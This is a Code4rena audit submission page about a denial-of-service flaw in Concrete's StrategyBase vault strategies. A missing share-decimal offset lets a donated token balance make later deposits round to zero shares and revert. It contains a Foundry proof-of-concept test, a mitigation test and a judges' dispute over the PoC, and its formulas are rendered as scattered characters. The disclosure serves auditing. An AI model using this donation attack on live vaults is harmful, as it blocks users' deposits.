@@ -1,0 +1,527 @@
+News
+
+Leaderboard
+
+Submissions
+
+Explore C4
+
+Audits
+
+Bounties
+
+Reports
+
+Support
+
+Resources
+
+Docs
+
+Terms
+
+Privacy
+
+saraswati
+Submissions
+Concrete
+/
+F-144
+Medium
+Primary
+S-436
+Attacker can DoS entire vault, preventing majority of users from completing deposits
+peter
+50
+Sufficient
+383d ago
+Finding description and impact
+
+Neither StrategyBase.sol nor any of the in-scope strategy implementations actually modify the ERC4626 functions necessary to implement the desired 9 share offset. As a result the offset remains at the default value of 0. While this (combined with 0 share mint revert) provides protection from inflation attacks, the protocol can still be exploited by DoS attacks, causing user deposits to revert. The DoS effect of the attack is further compounded by strategy allocations, i.e. the protocol is as weak as its lowest strategy allocation.
+
+Example attack:
+
+After vault/strategy initialization (1 strategy, 5% allocation (say)), attacker donates 5 tokens to Strategy 1
+Subsequent depositors can't deposit anything below 100 tokens + 20 wei, now. As a 100 token + 20 wei deposit allocates 5 tokens + 1 wei, enough to mint 1 share and not lead to rounding down to 0 shares (which causes the ZeroAmount() revert that DoSs the system)
+The attack donation can be arbitrarily high, and the degree of vulnerability of the protocol to this attack is defined by its lowest strategy allocation (e.g. 3 strategies where allocation is 10%, 10% and 1% respectively, would mean a 1000 token deposit will still revert if just 10 tokens are donated to the third strategy with 1% allocation)
+
+The key formula regarding the attack is _convertToShares() within StrategyBase and its associated strategy contracts, which gives shares minted in strategy:
+
+𝑠
+ℎ
+𝑎
+𝑟
+𝑒
+𝑠
+=
+𝑎
+𝑠
+𝑠
+𝑒
+𝑡
+𝑠
+×
+𝑡
+𝑜
+𝑡
+𝑎
+𝑙
+𝑆
+𝑢
+𝑝
+𝑝
+𝑙
+𝑦
+(
+)
++
+10
+∗
+∗
+𝑑
+𝑒
+𝑐
+𝑖
+𝑚
+𝑎
+𝑙
+𝑠
+𝑂
+𝑓
+𝑓
+𝑠
+𝑒
+𝑡
+(
+)
+𝑡
+𝑜
+𝑡
+𝑎
+𝑙
+𝐴
+𝑠
+𝑠
+𝑒
+𝑡
+𝑠
+(
+)
++
+1
+shares=assets×
+totalAssets()+1
+totalSupply()+10∗∗decimalsOffset()
+	​
+
+
+With assets == user deposit x allocation percentage, totalSupply() == 0 (no shares minted from users yet or through donation), offset == 0 and totalAssets() == attacker donation.
+
+The formula becomes:
+
+𝑠
+ℎ
+𝑎
+𝑟
+𝑒
+𝑠
+=
+(
+𝑢
+𝑠
+𝑒
+𝑟
+𝐷
+𝑒
+𝑝
+𝑜
+𝑠
+𝑖
+𝑡
+×
+𝑎
+𝑙
+𝑙
+𝑜
+𝑐
+𝑎
+𝑡
+𝑖
+𝑜
+𝑛
+𝑃
+𝑒
+𝑟
+𝑐
+𝑒
+𝑛
+𝑡
+𝑎
+𝑔
+𝑒
+)
+×
+1
+𝑎
+𝑡
+𝑡
+𝑎
+𝑐
+𝑘
+𝑒
+𝑟
+𝐷
+𝑜
+𝑛
+𝑎
+𝑡
+𝑖
+𝑜
+𝑛
++
+1
+shares=(userDeposit×allocationPercentage)×
+attackerDonation+1
+1
+	​
+
+
+Thus if 1 strategy has allocation 1%, say, regardless of the other allocations, we have with a user deposit of 1000 tokens and attacker donation to 1% strategy of 10 tokens:
+
+𝑠
+ℎ
+𝑎
+𝑟
+𝑒
+𝑠
+=
+(
+1000
+×
+0.01
+)
+×
+1
+10
++
+1
+=
+10
+11
+shares=(1000×0.01)×
+10+1
+1
+	​
+
+=
+11
+10
+	​
+
+ = 0 shares (floor rounded) -> ZeroAmount() revert
+
+Finally it is worth noting that the protocol admin cannot remove the donation directly through pulling funds from strategies or temporarily hiking protocol fees, as all of these involve burning protocol shares in strategies (which is 0 with donation).
+
+Proof of Concept
+
+The following PoC demonstrates the unhappy path detailed above. The PoC creates a new test suite using the ExampleStrategyBaseImplementation strategy. Note the decimals(), _convertToShares() and _convertToAssets() functions need to be commented out in ExampleStrategyBaseImplementation, because ExampleStrategyBaseImplementation, unlike the in-scope strategy contracts, actually correctly accounts for the offset.
+
+Create new file integrations.t.sol in /test/:
+
+Copy the following code into /test/integrations.t.sol:
+
+//SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+
+import {Test} from "forge-std/Test.sol";
+import {IERC20, IERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
+import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
+import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
+import {MockERC20} from "./utils/mocks/MockERC20.sol";
+import {MockERC4626} from "./utils/mocks/MockERC4626.sol";
+import {MockERC4626Queue} from "./utils/mocks/MockERC4626Queue.sol";
+import {MockERC4626Protect} from "./utils/mocks/MockERC4626Protect.sol";
+import {ConcreteMultiStrategyVault} from "../src/vault/ConcreteMultiStrategyVault.sol";
+import {IMockStrategy} from "../src/interfaces/IMockStrategy.sol";
+import {Strategy, VaultFees, Allocation, GraduatedFee} from "../src/interfaces/IConcreteMultiStrategyVault.sol";
+import {IStrategy, ReturnedRewards} from "../src/interfaces/IStrategy.sol";
+import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import {Errors} from "../src/interfaces/Errors.sol";
+import {WithdrawalQueue} from "../src/queue/WithdrawalQueue.sol";
+import {console} from "forge-std/console.sol";
+import {StrategyBase, RewardToken} from "../src/strategies/StrategyBase.sol";
+import {ExampleStrategyBaseImplementation} from "./utils/examples/ExampleStrategyBaseImplementation.sol";
+
+contract Integrations is Test {
+    using Math for uint256;
+
+    MockERC20 asset;
+    Strategy[] strategies;
+    ConcreteMultiStrategyVault vault;
+
+    GraduatedFee[] graduatedFees;
+    GraduatedFee[] zeroFees;
+
+    address strategyImplementation;
+    address implementation;
+    uint256 constant MAX_BASIS_POINTS = 10_000;     // 100%
+
+    address feeRecipient = address(0x1111);
+    address jimmy = address(0x2222);
+    address hazel = address(0x3333);
+    address admin = address(0x4444);
+
+    MockERC20 reward1;
+    RewardToken[] public rewardTokens;
+    ExampleStrategyBaseImplementation strategy;
+
+    // Deploying a ConcreteMultiStrategyVault with a single strategy
+    function setUp() public {
+        vm.label(feeRecipient, "feeRecipient");
+        vm.label(jimmy, "jimmy");
+        vm.label(hazel, "hazel");
+        // Example performanceFee: [{0000, 500, 300}, {501, 2000, 1000}, {2001, 5000, 2000}, {5001, 10000, 5000}]
+
+        graduatedFees.push(GraduatedFee({lowerBound: 0, upperBound: 500, fee: 300}));
+        graduatedFees.push(GraduatedFee({lowerBound: 501, upperBound: 2000, fee: 1000}));
+        graduatedFees.push(GraduatedFee({lowerBound: 2001, upperBound: 5000, fee: 2000}));
+        graduatedFees.push(GraduatedFee({lowerBound: 5001, upperBound: 10000, fee: 5000}));
+
+        zeroFees.push(GraduatedFee({lowerBound: 0, upperBound: 10000, fee: 0}));
+
+        asset = new MockERC20("Mock Asset", "MA", 18);
+        implementation = address(new ConcreteMultiStrategyVault());
+        address vaultAddress = Clones.clone(implementation);
+
+        vault = ConcreteMultiStrategyVault(vaultAddress);
+
+        reward1 = new MockERC20("Reward1", "R1", 18);
+        rewardTokens.push(RewardToken({token: reward1, fee: 1000, accumulatedFeeAccounted: 0}));
+
+        strategy = new ExampleStrategyBaseImplementation(       // Strategy 1
+            asset,
+            "StrategyBase",
+            "SBA",
+            feeRecipient,
+            type(uint256).max,
+            admin,
+            rewardTokens,
+            admin
+        );
+
+        strategies.push(Strategy({
+                strategy: strategy,
+                allocation: Allocation({index: 0, amount: 500})     // 5% allocation
+        }));
+
+        vault.initialize(
+            IERC20(address(asset)),
+            "Mock Vault",
+            "MV",
+            strategies,         // Initizing vault with a single strategy at 5% allocation
+            feeRecipient,                                                   
+            VaultFees({depositFee: 0, withdrawalFee: 0, protocolFee: 300, performanceFee: graduatedFees}),
+            type(uint256).max,
+            admin
+        );
+    }
+
+    function test_DepositRevertAttack() external {
+        console.log("Base asset decimals: ", asset.decimals());
+        console.log("Multistrategy vault decimals: ", vault.decimals());
+        console.log("Strategy decimals: ", strategy.decimals());
+
+        uint256 jimmyDonation = 5 ether;
+        uint256 hazelDeposit = 100 ether;
+
+        // Minting assets to users
+        console.log("Minting assets to users");
+        asset.mint(jimmy, jimmyDonation);
+        asset.mint(hazel, hazelDeposit);
+        console.log("Jimmy balance: ", asset.balanceOf(jimmy));
+        console.log("Hazel balance: ", asset.balanceOf(hazel));
+
+        // Jimmy donates 5 tokens to the vault
+        console.log("Jimmy donates 5 tokens to the vault");
+        vm.prank(jimmy);
+        asset.transfer(address(strategy), jimmyDonation);
+
+        // Hazel deposits 100 tokens to the vault
+        console.log("Hazel deposits 100 tokens to the vault");
+        vm.startPrank(hazel);
+        asset.approve(address(vault), hazelDeposit);
+        // Asserting Hazel's deposit reverts due to zero amount of shares minted
+        console.log("Asserting Hazel's deposit reverts due to zero amount of shares minted");
+        vm.expectRevert(Errors.ZeroAmount.selector);
+        vault.deposit(hazelDeposit, hazel);
+        vm.stopPrank();
+    }
+}
+
+Run forge test --match-test test_DepositRevertAttack -vvv in terminal
+
+Expected output:
+
+Ran 1 test for test/integrations.t.sol:Integrations
+[PASS] test_DepositRevertAttack() (gas: 328827)
+Logs:
+  Base asset decimals:  18
+  Multistrategy vault decimals:  27
+  Strategy decimals:  18
+  Minting assets to users
+  Jimmy balance:  5000000000000000000
+  Hazel balance:  100000000000000000000
+  Jimmy donates 5 tokens to the vault
+  Hazel deposits 100 tokens to the vault
+  Asserting Hazel's deposit reverts due to zero amount of shares minted
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.03ms (189.21µs CPU time)
+
+Ran 1 test suite in 101.86ms (1.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Recommended mitigation steps
+
+Modify decimals(), _convertToShares() and _convertToAssets() functions in StrategyBase, similar to how it is implemented in ExampleStrategyBaseImplementation. For testing purposes we can simply uncomment the 3 functions commented out in ExampleStrategyBaseImplementation. To prove this works, add the following test to integrations.t.sol:
+
+    function test_DepositsAccepted() external {
+        console.log("Base asset decimals: ", asset.decimals());
+        console.log("Multistrategy vault decimals: ", vault.decimals());
+        console.log("Strategy decimals: ", strategy.decimals());
+
+        uint256 jimmyDonation = 5 ether;
+        uint256 hazelDeposit = 100 ether;
+
+        // Minting assets to users
+        console.log("Minting assets to users");
+        asset.mint(jimmy, jimmyDonation);
+        asset.mint(hazel, hazelDeposit);
+        console.log("Jimmy balance: ", asset.balanceOf(jimmy));
+        console.log("Hazel balance: ", asset.balanceOf(hazel));
+
+        // Jimmy donates 5 tokens to the vault
+        console.log("Jimmy donates 5 tokens to the vault");
+        vm.prank(jimmy);
+        asset.transfer(address(strategy), jimmyDonation);
+
+        // Hazel deposits 100 tokens to the vault
+        console.log("Hazel deposits 100 tokens to the vault");
+        vm.startPrank(hazel);
+        asset.approve(address(vault), hazelDeposit);
+        vault.deposit(hazelDeposit, hazel);
+        // Assert Hazel mints vault shares
+        console.log("Assert Hazel mints vault shares");
+        assertGt(vault.balanceOf(address(hazel)), 0);
+        // Asserting strategy share supply > 0
+        console.log("Asserting strategy share supply > 0");
+        assertGt(strategy.totalSupply(), 0);
+        // Asserting Hazel's deposit was fully accepted
+        console.log("Asserting Hazel's deposit was fully accepted");
+        assertEq(asset.balanceOf(address(hazel)), 0);
+        vm.stopPrank();
+    }
+
+Run forge test --match-test test_DepositsAccepted -vvv, expected output:
+
+Ran 1 test for test/integrations.t.sol:Integrations
+[PASS] test_DepositsAccepted() (gas: 344997)
+Logs:
+  Base asset decimals:  18
+  Multistrategy vault decimals:  27
+  Strategy decimals:  27
+  Minting assets to users
+  Jimmy balance:  5000000000000000000
+  Hazel balance:  100000000000000000000
+  Jimmy donates 5 tokens to the vault
+  Hazel deposits 100 tokens to the vault
+  Assert Hazel mints vault shares
+  Asserting strategy share supply > 0
+  Asserting Hazel's deposit was fully accepted
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.08ms (206.04µs CPU time)
+
+Ran 1 test suite in 101.51ms (1.08ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Links to affected code
+StrategyBase.sol#L22-L385
+Opens in a new window
+Submissions touching same files
+StrategyBase.sol
+View full submission
+Comments for the judge
+1
+You are viewing comments for the primary submission, S-436.
+The provided PoC doesn't revert
+Edited: Feb 22
+gerantonyk
+
+The provided PoC doesn't revert. The offset is always 9. Could you provide more information to support this finding?
+
+Picodes
+12/27/2024
+
+Invalidating if the PoC is invalid
+
+peter
+OP
+01/08/2025
+
+The PoC clearly states that the test strategy base ExampleStrategyBaseImplementation does implement the offset correctly unlike the actual in-scope contracts:
+
+Note the decimals(), _convertToShares() and _convertToAssets() functions need to be commented out in ExampleStrategyBaseImplementation, because ExampleStrategyBaseImplementation, unlike the in-scope strategy contracts, actually correctly accounts for the offset.
+
+If you implement the PoC as instructed, it does work. I have made it very clear.
+
+Picodes
+01/26/2025
+
+Thanks for raising this. Rereading the contract you're right, strategies aren't implementing the desired offset.
+
+This being said I don't see how you're PoC is proving anything as you're not using any contract that is supposedly flawed, you're asking the dev to break ExampleStrategyBaseImplementation which isn't even in scope to exhibit that it doesn't work.
+
+peter
+OP
+01/26/2025
+
+@Picodes thanks for your response.
+
+The ExampleStrategyBaseImplementation is used in the test suite as a representative of the functionality of strategy base. I agree it is an unusual situation where the mock does implement the offset correctly, but the offset logic does indeed need to be commented out to correctly simulate the in-scope contract. You can use another mock strategy base if you want, but the offset needs to not be implemented (just as with the in-scope contract).
+
+Overall the offset is clearly not implemented as intended, and even without a PoC we can walk through why that would be a problem. The point I was trying to get across is that the offset is an isolated issue, so as long you have a strategy base mock that doesn't implement the offset, you will get an accurate simulation of the in-scope contracts.
+
+I have already provided a working PoC and PoC for the recommended mitigation steps, so not sure how I can demonstrate the issue much clearer. Thanks
+
+Duplicates
+4
+S-1460
+Decimals are incorrectly implemented in StrategyBase.sol
+MrPotatoMagic
+59
+S-1162
+The `Share` and `Asset` Conversions in the `StrategyBase` contract does not account for the `decimal offset` thus completely breaking the asset and share accounting in the vault
+Udsen
+27
+S-1050
+The decimals and decimalsOffset are not properly initialized across strategies, leading to less precise share calculations.
+focusoor
+00
+S-470
+Users' funds may be locked in the strategy because of the inflation attack
+0x37
+00
+Timeline
+Submitted
+Created: 545d ago
+High
+Triage
+Medium
+Valid
+Primary
+Sufficient
+Review
+Disputed
+Judging
+Medium
+Valid
+Sufficient
+Post-judging QA
+Complete
+Reporting
+Complete
